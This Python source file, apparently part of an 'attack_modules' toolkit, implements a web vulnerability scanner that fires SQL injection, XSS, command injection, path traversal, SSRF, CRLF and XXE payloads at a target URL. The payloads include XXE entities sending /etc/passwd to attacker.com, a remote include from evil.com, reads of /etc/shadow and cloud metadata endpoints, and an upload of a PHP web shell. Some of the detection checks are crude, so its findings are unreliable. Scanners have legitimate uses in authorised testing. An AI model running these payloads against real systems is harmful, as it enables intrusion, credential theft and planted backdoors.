# [file name]: attack_modules/vuln_scanner.py

# !/usr/bin/env python3
"""
🔎 通用漏洞扫描模块 - 综合漏洞检测引擎
"""

import requests
import re
import json
import time
import socket
import ssl
from urllib.parse import urljoin, urlparse, quote, unquote
from typing import Dict, List, Optional, Tuple
import logging

logger = logging.getLogger(__name__)


class VulnerabilityScanner:
    """通用漏洞扫描器"""

    def __init__(self, config: Dict):
        self.config = config
        self.timeout = config.get('scan', {}).get('timeout', 15)

        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })

        # 漏洞特征库
        self.vulnerability_db = self.load_vulnerability_database()

    def load_vulnerability_database(self) -> Dict:
        """加载漏洞特征库"""
        return {
            'sql_injection': {
                'payloads': [
                    "'", "\"", "' OR '1'='1", "' OR 1=1--", "' UNION SELECT NULL--",
                    "1' AND '1'='1", "1' AND '1'='2", "' AND SLEEP(5)--",
                    "1' WAITFOR DELAY '0:0:5'--", "' OR 'a'='a", "' OR 1=1#"
                ],
                'error_patterns': [
                    'sql', 'mysql', 'syntax', 'error', 'exception',
                    '警告', '错误', '语法', '数据库', 'query',
                    'postgresql', 'oracle', 'microsoft', 'odbc',
                    'driver', 'parameter', 'invalid'
                ],
                'techniques': ['error_based', 'boolean_based', 'time_based']
            },
            'xss': {
                'payloads': [
                    "<script>alert('XSS')</script>",
                    "<img src=x onerror=alert(1)>",
                    "\" onmouseover=\"alert(1)",
                    "<svg onload=alert(1)>",
                    "javascript:alert(1)",
                    "<body onload=alert(1)>",
                    "<iframe src=javascript:alert(1)>",
                    "<input onfocus=alert(1) autofocus>",
                    "<video onloadstart=alert(1)>",
                    "<audio onplay=alert(1)>"
                ],
                'contexts': ['html', 'attribute', 'javascript', 'url']
            },
            'command_injection': {
                'payloads': [
                    ";ls", "| ls", "&& ls", "|| ls", "`ls`",
                    ";id", "| id", "&& id", "`id`",
                    ";whoami", "| whoami", "&& whoami",
                    ";cat /etc/passwd", "| cat /etc/passwd",
                    "$(ls)", "%3Bid", "%7Cid", "%26%26id"
                ],
                'os_indicators': {
                    'linux': ['root:', 'bin/', 'etc/'],
                    'windows': ['Volume', 'Windows', 'Program Files']
                }
            },
            'path_traversal': {
                'payloads': [
                    "../../../etc/passwd",
                    "..\\..\\..\\windows\\win.ini",
                    "../../../../etc/shadow",
                    "../../../../etc/hosts",
                    "....//....//....//etc/passwd",
                    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                    "..%255c..%255c..%255c..%255cwindows%255cwin.ini"
                ],
                'success_indicators': ['root:', '[boot loader]', 'localhost']
            },
            'file_inclusion': {
                'payloads': [
                    "../../../etc/passwd",
                    "php://filter/convert.base64-encode/resource=index.php",
                    "file:///etc/passwd",
                    "http://evil.com/shell.txt",
                    "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+",
                    "expect://id",
                    "zip://path/to/file.zip#file.txt"
                ]
            },
            'ssrf': {
                'payloads': [
                    "http://localhost",
                    "http://127.0.0.1",
                    "http://169.254.169.254",
                    "http://[::1]",
                    "file:///etc/passwd",
                    "gopher://localhost",
                    "dict://localhost:6379/info"
                ],
                'targets': [
                    'metadata.google.internal',
                    '169.254.169.254',  # AWS, Azure, GCP
                    '100.100.100.200',  # Alibaba Cloud
                    '192.168.0.1',
                    'localhost'
                ]
            },
            'xxe': {
                'payloads': [
                    '''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>''',
                    '''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd"> %xxe;]>''',
                    '''<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?%xxe;'>">
%eval;
%exfil;
]>'''
                ]
            }
        }

    def comprehensive_scan(self, target: str, recon_info: Dict = None) -> List[Dict]:
        """全面漏洞扫描"""
        results = []

        print("    🔎 执行全面漏洞扫描...")

        # 1. 输入点发现
        print("      发现输入点...")
        input_points = self.discover_input_points(target)

        if not input_points:
            print("      未发现输入点")
            return results

        print(f"      发现 {len(input_points)} 个输入点")

        # 2. 针对每个输入点进行测试
        for i, input_point in enumerate(input_points[:10]):  # 限制测试前10个
            print(f"      测试输入点 {i + 1}/{min(len(input_points), 10)}: {input_point['url']}")

            # 根据类型选择测试
            if input_point['type'] in ['query_param', 'form_param']:
                param_results = self.test_parameter_vulnerabilities(input_point)
                results.extend(param_results)

            elif input_point['type'] == 'header':
                header_results = self.test_header_vulnerabilities(input_point)
                results.extend(header_results)

            elif input_point['type'] == 'file_upload':
                upload_results = self.test_upload_vulnerabilities(input_point)
                results.extend(upload_results)

        # 3. 服务器端测试
        server_results = self.test_server_vulnerabilities(target)
        results.extend(server_results)

        # 4. 框架/CMS特定漏洞
        if recon_info:
            specific_results = self.test_specific_vulnerabilities(target, recon_info)
            results.extend(specific_results)

        return results

    def discover_input_points(self, target: str) -> List[Dict]:
        """发现输入点"""
        input_points = []

        try:
            response = self.session.get(target, timeout=self.timeout, verify=False)
            content = response.text

            # 1. 查询参数
            parsed_url = urlparse(target)
            query_params = self.parse_query_params(parsed_url.query)

            for param_name in query_params:
                input_points.append({
                    'url': target,
                    'type': 'query_param',
                    'name': param_name,
                    'value': query_params[param_name],
                    'method': 'GET'
                })

            # 2. 表单参数
            forms = self.extract_forms(content, target)
            for form in forms:
                for field_name, field_info in form['fields'].items():
                    input_points.append({
                        'url': form['action'],
                        'type': 'form_param',
                        'name': field_name,
                        'value': field_info.get('value', ''),
                        'method': form['method']
                    })

            # 3. JSON参数（从API响应中推断）
            if 'application/json' in response.headers.get('Content-Type', ''):
                try:
                    json_data = response.json()
                    # 简单识别可能的参数
                    if isinstance(json_data, dict):
                        for key in json_data.keys():
                            if isinstance(json_data[key], (str, int, float)):
                                input_points.append({
                                    'url': target,
                                    'type': 'json_param',
                                    'name': key,
                                    'value': str(json_data[key]),
                                    'method': 'POST'
                                })
                except:
                    pass

            # 4. Headers中的输入点
            headers_to_test = ['X-Forwarded-For', 'User-Agent', 'Referer', 'Cookie']
            for header in headers_to_test:
                input_points.append({
                    'url': target,
                    'type': 'header',
                    'name': header,
                    'value': response.request.headers.get(header, ''),
                    'method': 'GET'
                })

            # 5. 查找文件上传点
            upload_points = self.find_upload_points(content, target)
            input_points.extend(upload_points)

        except Exception as e:
            logger.error(f"输入点发现失败: {e}")

        return input_points

    def parse_query_params(self, query_string: str) -> Dict:
        """解析查询参数"""
        params = {}

        if not query_string:
            return params

        pairs = query_string.split('&')
        for pair in pairs:
            if '=' in pair:
                key, value = pair.split('=', 1)
                params[unquote(key)] = unquote(value)
            else:
                params[unquote(pair)] = ''

        return params

    def extract_forms(self, html: str, base_url: str) -> List[Dict]:
        """提取表单信息"""
        forms = []

        form_pattern = r'<form[^>]*>(.*?)</form>'
        form_matches = re.findall(form_pattern, html, re.IGNORECASE | re.DOTALL)

        for form_html in form_matches:
            form_info = {
                'action': base_url,
                'method': 'POST',
                'fields': {}
            }

            # 提取action
            action_match = re.search(r'action\s*=\s*["\']([^"\']*)["\']', form_html, re.I)
            if action_match:
                action = action_match.group(1).strip()
                if action:
                    if not action.startswith(('http://', 'https://', '//')):
                        action = urljoin(base_url, action)
                    form_info['action'] = action

            # 提取method
            method_match = re.search(r'method\s*=\s*["\']([^"\']+)["\']', form_html, re.I)
            if method_match:
                form_info['method'] = method_match.group(1).upper()

            # 提取字段
            input_pattern = r'<input[^>]*>'
            input_matches = re.findall(input_pattern, form_html, re.I)

            for input_tag in input_matches:
                # 提取name
                name_match = re.search(r'name\s*=\s*["\']([^"\']+)["\']', input_tag, re.I)
                if not name_match:
                    continue

                field_name = name_match.group(1)
                field_info = {'type': 'text', 'value': ''}

                # 提取type
                type_match = re.search(r'type\s*=\s*["\']([^"\']+)["\']', input_tag, re.I)
                if type_match:
                    field_info['type'] = type_match.group(1).lower()

                # 提取value
                value_match = re.search(r'value\s*=\s*["\']([^"\']*)["\']', input_tag, re.I)
                if value_match:
                    field_info['value'] = value_match.group(1)

                # 检查文件上传
                if field_info['type'] == 'file':
                    field_info['is_file_upload'] = True

                form_info['fields'][field_name] = field_info

            if form_info['fields']:
                forms.append(form_info)

        return forms

    def find_upload_points(self, html: str, base_url: str) -> List[Dict]:
        """查找文件上传点"""
        upload_points = []

        # 查找文件上传表单
        file_patterns = [
            r'type\s*=\s*["\']file["\']',
            r'<input[^>]*type=["\']file["\'][^>]*>',
            r'accept\s*=\s*["\'][^"\']*image[^"\']*["\']'
        ]

        for pattern in file_patterns:
            matches = re.finditer(pattern, html, re.I)

            for match in matches:
                # 查找包含这个input的表单
                context_start = max(0, match.start() - 500)
                context_end = min(len(html), match.end() + 500)
                context = html[context_start:context_end]

                # 查找最近的表单
                form_start = context.rfind('<form')
                form_end = context.find('</form>', match.start() - context_start)

                if form_start != -1 and form_end != -1:
                    form_html = context[form_start:form_end + 7]

                    # 提取表单信息
                    action_match = re.search(r'action\s*=\s*["\']([^"\']*)["\']', form_html, re.I)
                    if action_match:
                        action = action_match.group(1).strip()
                        if action:
                            if not action.startswith(('http://', 'https://', '//')):
                                action = urljoin(base_url, action)

                            upload_points.append({
                                'url': action,
                                'type': 'file_upload',
                                'name': 'file',
                                'value': '',
                                'method': 'POST'
                            })

        return upload_points

    def test_parameter_vulnerabilities(self, input_point: Dict) -> List[Dict]:
        """测试参数漏洞"""
        results = []
        url = input_point['url']
        param_name = input_point['name']
        original_value = input_point['value']

        # 1. SQL注入测试
        sql_results = self.test_sql_injection(url, param_name, original_value, input_point['method'])
        results.extend(sql_results)

        # 2. XSS测试
        xss_results = self.test_xss(url, param_name, original_value, input_point['method'])
        results.extend(xss_results)

        # 3. 命令注入测试
        cmd_results = self.test_command_injection(url, param_name, original_value, input_point['method'])
        results.extend(cmd_results)

        # 4. 路径遍历测试
        path_results = self.test_path_traversal(url, param_name, original_value, input_point['method'])
        results.extend(path_results)

        # 5. SSRF测试
        ssrf_results = self.test_ssrf(url, param_name, original_value, input_point['method'])
        results.extend(ssrf_results)

        return results

    def test_sql_injection(self, url: str, param_name: str,
                           original_value: str, method: str) -> List[Dict]:
        """测试SQL注入"""
        vulns = []

        payloads = self.vulnerability_db['sql_injection']['payloads']
        error_patterns = self.vulnerability_db['sql_injection']['error_patterns']

        for payload in payloads[:8]:  # 测试前8个payload
            test_value = payload

            try:
                if method == 'GET':
                    # 替换URL中的参数
                    parsed_url = urlparse(url)
                    query_params = self.parse_query_params(parsed_url.query)
                    query_params[param_name] = test_value

                    # 重建URL
                    new_query = '&'.join([f'{quote(k)}={quote(v)}' for k, v in query_params.items()])
                    test_url = parsed_url._replace(query=new_query).geturl()

                    response = self.session.get(test_url, timeout=5, verify=False)

                else:  # POST
                    data = {param_name: test_value}
                    response = self.session.post(url, data=data, timeout=5, verify=False)

                content = response.text.lower()

                # 检查错误信息
                for pattern in error_patterns:
                    if pattern in content:
                        vulns.append({
                            'type': 'sql_injection',
                            'severity': 'high',
                            'description': f'SQL注入漏洞检测 - 参数: {param_name}',
                            'url': response.url,
                            'payload': payload,
                            'evidence': f'发现错误模式: {pattern}',
                            'method': method
                        })
                        break

                # 检查响应时间（时间盲注）
                if 'sleep' in payload.lower() or 'waitfor' in payload.lower():
                    # 记录响应时间
                    pass

            except:
                continue

        return vulns

    def test_xss(self, url: str, param_name: str,
                 original_value: str, method: str) -> List[Dict]:
        """测试XSS漏洞"""
        vulns = []

        payloads = self.vulnerability_db['xss']['payloads']

        for payload in payloads[:5]:  # 测试前5个payload
            test_value = payload

            try:
                if method == 'GET':
                    parsed_url = urlparse(url)
                    query_params = self.parse_query_params(parsed_url.query)
                    query_params[param_name] = test_value

                    new_query = '&'.join([f'{quote(k)}={quote(v)}' for k, v in query_params.items()])
                    test_url = parsed_url._replace(query=new_query).geturl()

                    response = self.session.get(test_url, timeout=5, verify=False)

                else:  # POST
                    data = {param_name: test_value}
                    response = self.session.post(url, data=data, timeout=5, verify=False)

                content = response.text

                # 检查payload是否被反射
                if payload in content:
                    # 检查是否被编码或过滤
                    encoded_payload = quote(payload)
                    if encoded_payload in content:
                        vulns.append({
                            'type': 'xss_reflected',
                            'severity': 'medium',
                            'description': f'反射型XSS漏洞 - 参数: {param_name}',
                            'url': response.url,
                            'payload': payload,
                            'evidence': '输入被反射且未充分编码',
                            'method': method
                        })
                    else:
                        vulns.append({
                            'type': 'xss_reflected',
                            'severity': 'high',
                            'description': f'反射型XSS漏洞 - 参数: {param_name}',
                            'url': response.url,
                            'payload': payload,
                            'evidence': '输入被原样反射',
                            'method': method
                        })

            except:
                continue

        return vulns

    def test_command_injection(self, url: str, param_name: str,
                               original_value: str, method: str) -> List[Dict]:
        """测试命令注入"""
        vulns = []

        payloads = self.vulnerability_db['command_injection']['payloads']
        os_indicators = self.vulnerability_db['command_injection']['os_indicators']

        for payload in payloads[:6]:  # 测试前6个payload
            test_value = payload

            try:
                if method == 'GET':
                    parsed_url = urlparse(url)
                    query_params = self.parse_query_params(parsed_url.query)
                    query_params[param_name] = test_value

                    new_query = '&'.join([f'{quote(k)}={quote(v)}' for k, v in query_params.items()])
                    test_url = parsed_url._replace(query=new_query).geturl()

                    response = self.session.get(test_url, timeout=10, verify=False)

                else:  # POST
                    data = {param_name: test_value}
                    response = self.session.post(url, data=data, timeout=10, verify=False)

                content = response.text

                # 检查操作系统特征
                for os_type, indicators in os_indicators.items():
                    for indicator in indicators:
                        if indicator in content:
                            vulns.append({
                                'type': 'command_injection',
                                'severity': 'high',
                                'description': f'命令注入漏洞 - 参数: {param_name}',
                                'url': response.url,
                                'payload': payload,
                                'evidence': f'发现{os_type}系统特征: {indicator}',
                                'method': method
                            })
                            break

            except:
                continue

        return vulns

    def test_path_traversal(self, url: str, param_name: str,
                            original_value: str, method: str) -> List[Dict]:
        """测试路径遍历"""
        vulns = []

        payloads = self.vulnerability_db['path_traversal']['payloads']
        success_indicators = self.vulnerability_db['path_traversal']['success_indicators']

        for payload in payloads[:4]:  # 测试前4个payload
            test_value = payload

            try:
                if method == 'GET':
                    parsed_url = urlparse(url)
                    query_params = self.parse_query_params(parsed_url.query)
                    query_params[param_name] = test_value

                    new_query = '&'.join([f'{quote(k)}={quote(v)}' for k, v in query_params.items()])
                    test_url = parsed_url._replace(query=new_query).geturl()

                    response = self.session.get(test_url, timeout=5, verify=False)

                else:  # POST
                    data = {param_name: test_value}
                    response = self.session.post(url, data=data, timeout=5, verify=False)

                content = response.text

                # 检查成功指标
                for indicator in success_indicators:
                    if indicator in content:
                        vulns.append({
                            'type': 'path_traversal',
                            'severity': 'high',
                            'description': f'路径遍历漏洞 - 参数: {param_name}',
                            'url': response.url,
                            'payload': payload,
                            'evidence': f'成功读取文件: 发现"{indicator}"',
                            'method': method
                        })
                        break

            except:
                continue

        return vulns

    def test_ssrf(self, url: str, param_name: str,
                  original_value: str, method: str) -> List[Dict]:
        """测试SSRF漏洞"""
        vulns = []

        payloads = self.vulnerability_db['ssrf']['payloads']
        targets = self.vulnerability_db['ssrf']['targets']

        for payload in payloads[:3]:  # 测试前3个payload
            test_value = payload

            try:
                if method == 'GET':
                    parsed_url = urlparse(url)
                    query_params = self.parse_query_params(parsed_url.query)
                    query_params[param_name] = test_value

                    new_query = '&'.join([f'{quote(k)}={quote(v)}' for k, v in query_params.items()])
                    test_url = parsed_url._replace(query=new_query).geturl()

                    response = self.session.get(test_url, timeout=8, verify=False)

                else:  # POST
                    data = {param_name: test_value}
                    response = self.session.post(url, data=data, timeout=8, verify=False)

                content = response.text

                # 检查响应中是否包含目标信息
                for target in targets:
                    if target in content:
                        vulns.append({
                            'type': 'ssrf',
                            'severity': 'high',
                            'description': f'SSRF漏洞 - 参数: {param_name}',
                            'url': response.url,
                            'payload': payload,
                            'evidence': f'访问到内部目标: {target}',
                            'method': method
                        })
                        break

            except:
                continue

        return vulns

    def test_header_vulnerabilities(self, input_point: Dict) -> List[Dict]:
        """测试头部漏洞"""
        results = []

        # 主要测试Host头攻击和CRLF注入
        header_name = input_point['name']

        if header_name == 'Host':
            host_results = self.test_host_header_injection(input_point['url'])
            results.extend(host_results)

        # CRLF注入测试
        crlf_results = self.test_crlf_injection(input_point['url'], header_name)
        results.extend(crlf_results)

        return results

    def test_host_header_injection(self, url: str) -> List[Dict]:
        """测试Host头注入"""
        vulns = []

        malicious_hosts = [
            'evil.com',
            'localhost:80@evil.com',
            'localhost%0d%0aX-Forwarded-Host: evil.com',
            '127.0.0.1',
            '169.254.169.254'
        ]

        for host in malicious_hosts:
            try:
                headers = {'Host': host}
                response = self.session.get(url, headers=headers, timeout=5, verify=False)

                # 检查响应中是否包含恶意host
                content = response.text
                if host.replace('%0d%0a', '\r\n') in content:
                    vulns.append({
                        'type': 'host_header_injection',
                        'severity': 'medium',
                        'description': 'Host头注入漏洞',
                        'url': url,
                        'payload': host,
                        'evidence': '恶意Host头被反射到响应中'
                    })
                    break

            except:
                continue

        return vulns

    def test_crlf_injection(self, url: str, header_name: str) -> List[Dict]:
        """测试CRLF注入"""
        vulns = []

        crlf_payloads = [
            'test%0d%0aX-Injected: header',
            'test%0d%0a%0d%0aHTTP/1.1 200 OK',
            'test%0aX-Injected: header',
            'test%0dX-Injected: header'
        ]

        for payload in crlf_payloads:
            try:
                headers = {header_name: payload}
                response = self.session.get(url, headers=headers, timeout=5, verify=False)

                # 检查响应头是否被注入
                response_headers = str(response.headers).lower()
                if 'x-injected' in response_headers:
                    vulns.append({
                        'type': 'crlf_injection',
                        'severity': 'medium',
                        'description': f'CRLF注入漏洞 - 头部: {header_name}',
                        'url': url,
                        'payload': payload,
                        'evidence': '成功注入响应头'
                    })
                    break

            except:
                continue

        return vulns

    def test_upload_vulnerabilities(self, input_point: Dict) -> List[Dict]:
        """测试文件上传漏洞"""
        vulns = []

        print("      测试文件上传漏洞...")

        # 测试文件上传绕过
        bypass_tests = [
            {
                'filename': 'test.php.jpg',
                'content': '<?php echo "test"; ?>',
                'content_type': 'image/jpeg'
            },
            {
                'filename': 'test.pHp',
                'content': '<?php system($_GET["cmd"]); ?>',
                'content_type': 'text/plain'
            },
            {
                'filename': 'test.php%00.jpg',
                'content': '<?php phpinfo(); ?>',
                'content_type': 'image/jpeg'
            },
            {
                'filename': 'test.php.',
                'content': '<?php echo "test"; ?>',
                'content_type': 'application/x-php'
            }
        ]

        for test in bypass_tests:
            try:
                files = {
                    input_point['name']: (
                        test['filename'],
                        test['content'],
                        test['content_type']
                    )
                }

                response = self.session.post(
                    input_point['url'],
                    files=files,
                    timeout=10,
                    verify=False
                )

                # 检查响应
                if response.status_code in [200, 201]:
                    # 尝试访问上传的文件
                    upload_url = self.guess_upload_url(input_point['url'], test['filename'])

                    if upload_url:
                        file_response = self.session.get(upload_url, timeout=5, verify=False)

                        if file_response.status_code == 200:
                            if '<?php' in file_response.text:
                                vulns.append({
                                    'type': 'file_upload_bypass',
                                    'severity': 'high',
                                    'description': '文件上传绕过漏洞',
                                    'url': input_point['url'],
                                    'filename': test['filename'],
                                    'upload_url': upload_url,
                                    'evidence': '成功上传并执行PHP文件'
                                })
                                break

            except:
                continue

        return vulns

    def guess_upload_url(self, base_url: str, filename: str) -> Optional[str]:
        """猜测上传文件的URL"""
        possible_paths = [
            '/uploads/',
            '/upload/',
            '/files/',
            '/images/',
            '/media/',
            '/tmp/',
            '/'
        ]

        for path in possible_paths:
            upload_url = urljoin(base_url, path + filename)

            try:
                response = self.session.head(upload_url, timeout=3, verify=False)
                if response.status_code == 200:
                    return upload_url
            except:
                continue

        return None

    def test_server_vulnerabilities(self, target: str) -> List[Dict]:
        """测试服务器端漏洞"""
        vulns = []

        print("      测试服务器端漏洞...")

        # 1. SSL/TLS测试
        ssl_vulns = self.test_ssl_tls(target)
        vulns.extend(ssl_vulns)

        # 2. HTTP方法测试
        http_vulns = self.test_http_methods(target)
        vulns.extend(http_vulns)

        # 3. 信息泄露测试
        info_vulns = self.test_information_disclosure(target)
        vulns.extend(info_vulns)

        return vulns

    def test_ssl_tls(self, target: str) -> List[Dict]:
        """测试SSL/TLS配置"""
        vulns = []

        try:
            parsed_url = urlparse(target)
            hostname = parsed_url.hostname
            port = parsed_url.port or 443

            # 创建SSL上下文
            context = ssl.create_default_context()

            with socket.create_connection((hostname, port), timeout=5) as sock:
                with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                    cipher = ssock.cipher()
                    cert = ssock.getpeercert()

                    # 检查弱密码套件
                    weak_ciphers = ['RC4', 'DES', '3DES', 'MD5', 'SHA1', 'NULL', 'EXPORT']
                    if any(weak in str(cipher) for weak in weak_ciphers):
                        vulns.append({
                            'type': 'weak_ssl_cipher',
                            'severity': 'medium',
                            'description': '使用弱SSL/TLS密码套件',
                            'target': target,
                            'cipher': cipher
                        })

                    # 检查证书信息
                    if cert:
                        # 检查过期时间
                        from datetime import datetime
                        not_after = datetime.strptime(cert['notAfter'], '%b %d %H:%M:%S %Y %Z')
                        days_remaining = (not_after - datetime.now()).days

                        if days_remaining < 30:
                            vulns.append({
                                'type': 'ssl_cert_expiring',
                                'severity': 'low',
                                'description': f'SSL证书将在{days_remaining}天后过期',
                                'target': target,
                                'expiry_date': cert['notAfter']
                            })

        except ssl.SSLError as e:
            vulns.append({
                'type': 'ssl_error',
                'severity': 'info',
                'description': f'SSL/TLS错误: {e}',
                'target': target
            })
        except:
            pass

        return vulns

    def test_http_methods(self, target: str) -> List[Dict]:
        """测试HTTP方法"""
        vulns = []

        dangerous_methods = ['PUT', 'DELETE', 'PATCH', 'TRACE', 'CONNECT']

        for method in dangerous_methods:
            try:
                response = self.session.request(method, target, timeout=5, verify=False)

                if response.status_code not in [405, 403, 401, 501]:
                    vulns.append({
                        'type': 'dangerous_http_method',
                        'severity': 'medium',
                        'description': f'启用了危险的HTTP方法: {method}',
                        'target': target,
                        'method': method,
                        'status': response.status_code
                    })

            except:
                continue

        return vulns

    def test_information_disclosure(self, target: str) -> List[Dict]:
        """测试信息泄露"""
        vulns = []

        sensitive_files = [
            '/.env', '/.env.example', '/.env.local',
            '/config.php', '/configuration.php', '/settings.php',
            '/web.config', '/server.xml', '/.htaccess',
            '/phpinfo.php', '/info.php', '/test.php',
            '/debug.php', '/console', '/admin/config',
            '/.git/HEAD', '/.git/config', '/.svn/entries',
            '/package.json', '/composer.json', '/pom.xml',
            '/.DS_Store', '/robots.txt', '/sitemap.xml',
            '/crossdomain.xml', '/security.txt'
        ]

        for file in sensitive_files:
            file_url = urljoin(target, file)

            try:
                response = self.session.get(file_url, timeout=3, verify=False)

                if response.status_code == 200:
                    content = response.text

                    # 检查是否为敏感文件
                    sensitive_indicators = [
                        ('APP_KEY=', 'Laravel应用密钥'),
                        ('DB_PASSWORD=', '数据库密码'),
                        ('SECRET_KEY=', '加密密钥'),
                        ('database', '数据库配置'),
                        ('password', '密码信息'),
                        ('<?php', 'PHP源代码'),
                        ('<configuration>', '配置文件'),
                        ('ref: refs/', 'Git信息'),
                        ('[svn]', 'SVN配置')
                    ]

                    found_indicators = []
                    for indicator, description in sensitive_indicators:
                        if indicator in content:
                            found_indicators.append(description)

                    if found_indicators:
                        vulns.append({
                            'type': 'information_disclosure',
                            'severity': 'medium',
                            'description': f'敏感文件泄露: {file}',
                            'url': file_url,
                            'indicators': found_indicators[:3]
                        })
                        break

            except:
                continue

        return vulns

    def test_specific_vulnerabilities(self, target: str, recon_info: Dict) -> List[Dict]:
        """测试框架/CMS特定漏洞"""
        vulns = []

        tech_stack = recon_info.get('tech_stack', [])
        cms_type = recon_info.get('cms')

        # WordPress特定测试
        if cms_type == 'WordPress' or 'WordPress' in tech_stack:
            wp_vulns = self.test_wordpress_vulnerabilities(target)
            vulns.extend(wp_vulns)

        # Laravel特定测试
        if 'Laravel' in tech_stack:
            laravel_vulns = self.test_laravel_vulnerabilities(target)
            vulns.extend(laravel_vulns)

        # Django特定测试
        if 'Django' in tech_stack:
            django_vulns = self.test_django_vulnerabilities(target)
            vulns.extend(django_vulns)

        return vulns

    def test_wordpress_vulnerabilities(self, target: str) -> List[Dict]:
        """测试WordPress特定漏洞"""
        vulns = []

        # 测试xmlrpc.php
        xmlrpc_url = urljoin(target, '/xmlrpc.php')

        try:
            response = self.session.get(xmlrpc_url, timeout=5, verify=False)

            if response.status_code == 200 and 'XML-RPC' in response.text:
                # 测试pingback攻击
                pingback_payload = '''<?xml version="1.0" encoding="utf-8"?>
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://attacker.com</string></value></param>
<param><value><string>http://target.com</string></value></param>
</params>
</methodCall>'''

                headers = {'Content-Type': 'text/xml'}
                pingback_response = self.session.post(
                    xmlrpc_url,
                    data=pingback_payload,
                    headers=headers,
                    timeout=5,
                    verify=False
                )

                if 'faultCode' not in pingback_response.text:
                    vulns.append({
                        'type': 'wordpress_xmlrpc_enabled',
                        'severity': 'medium',
                        'description': 'WordPress XML-RPC接口启用，可能存在SSRF风险',
                        'url': xmlrpc_url
                    })

        except:
            pass

        return vulns

    def test_laravel_vulnerabilities(self, target: str) -> List[Dict]:
        """测试Laravel特定漏洞"""
        vulns = []

        # 测试.env文件
        env_url = urljoin(target, '/.env')

        try:
            response = self.session.get(env_url, timeout=5, verify=False)

            if response.status_code == 200:
                content = response.text

                if 'APP_KEY=' in content or 'DB_' in content:
                    vulns.append({
                        'type': 'laravel_env_exposed',
                        'severity': 'high',
                        'description': 'Laravel .env配置文件泄露',
                        'url': env_url
                    })

        except:
            pass

        return vulns

    def test_django_vulnerabilities(self, target: str) -> List[Dict]:
        """测试Django特定漏洞"""
        vulns = []

        # 测试调试页面
        debug_url = urljoin(target, '/test-nonexistent-page-12345/')

        try:
            response = self.session.get(debug_url, timeout=5, verify=False)

            if response.status_code == 404:
                content = response.text

                if 'DEBUG = True' in content or 'You\'re seeing this error because you have' in content:
                    vulns.append({
                        'type': 'django_debug_enabled',
                        'severity': 'high',
                        'description': 'Django调试模式启用，暴露敏感信息',
                        'url': debug_url
                    })

        except:
            pass

        return vulns


# 测试函数
def test_vuln_scanner():
    """测试漏洞扫描模块"""
    print("=" * 60)
    print("🧪 漏洞扫描模块测试")
    print("=" * 60)

    config = {
        'scan': {'timeout': 10}
    }

    scanner = VulnerabilityScanner(config)

    # 测试输入点发现
    test_url = "http://example.com"
    input_points = scanner.discover_input_points(test_url)

    print(f"发现 {len(input_points)} 个输入点")

    print("\n" + "=" * 60)


if __name__ == "__main__":
    test_vuln_scanner()
